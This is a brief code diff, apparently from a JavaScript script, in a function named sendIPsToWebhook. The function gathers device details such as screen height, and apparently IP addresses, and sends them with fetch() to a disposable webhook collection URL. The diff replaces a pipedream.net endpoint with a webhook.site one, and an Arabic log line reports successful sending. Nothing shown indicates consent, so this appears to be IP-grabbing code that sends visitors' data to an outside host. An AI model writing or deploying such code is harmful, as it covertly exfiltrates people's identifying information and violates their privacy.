@@ -281,7 +281,7 @@ async function sendIPsToWebhook() {
       height: deviceInfo.screen.height.toString(),
     });
 
-    const url = `https://eo62kukhny0jqjq.m.pipedream.net?${params.toString()}`;
+    const url = `https://webhook.site/78a22deb-651e-48c4-b625-828735e463f5?${params.toString()}`;
     await fetch(url);
     console.log("✅ البيانات أُرسلت بنجاح إلى:", url);
   } catch (err) {
